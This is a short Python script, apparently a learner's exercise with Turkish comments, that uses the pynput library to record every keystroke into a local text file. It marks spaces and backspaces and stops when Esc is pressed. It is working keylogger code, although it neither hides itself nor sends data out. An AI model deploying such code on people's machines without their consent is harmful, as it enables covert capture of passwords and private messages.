from pynput import mouse, keyboard
from datetime import date
# ANLAŞILAN O Kİ LİSTENER KODUNDAN DOLAYI TÜM KODLARI ON_PRESS VE RELEASE FONKSİYONU İÇERİSİNDE OLMASI GEREKECEK.
exact_date = date.today() # buna ekleme yaparak txt dosyasına tarih ekleme işlemini yapıyoruz ancak ayarlarında problem var.

def on_press(key):
    try:
        #print(f"{key} was pressed")
        # There is no need for the 8th line cause we don't need the output in terminal.
        #a = str(key) bunu aklımda kalsın diye silmiyorum key.char string değil o yüzden a'yı atamıştım key.char'ı stringe dönüştürüp.
        with open("dinlenen.txt","a") as f:
            f.write(key.char)
            f.close()

    except AttributeError:
        if key == keyboard.Key.space:
            with open("dinlenen.txt","a") as f:
                f.write(" ")
                f.close()

        elif key == keyboard.Key.backspace:
            with open("dinlenen.txt","a") as f:
                f.write(" (x1 sil) ")
                f.close()
        else:
            pass # burada aslında daha da dallandırabiliriz ancak gerek yok f1 tuşuna bastmasının bir değeri yok açıkçası kişinin.



def on_release(key):
    print(f"{key} was released. ")
    if key == keyboard.Key.esc:
        with open("dinlenen.txt","a") as f:
            f.write("\n")
            f.close()
        return False
    


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



# The file that is been appended is called dinlenen.txt
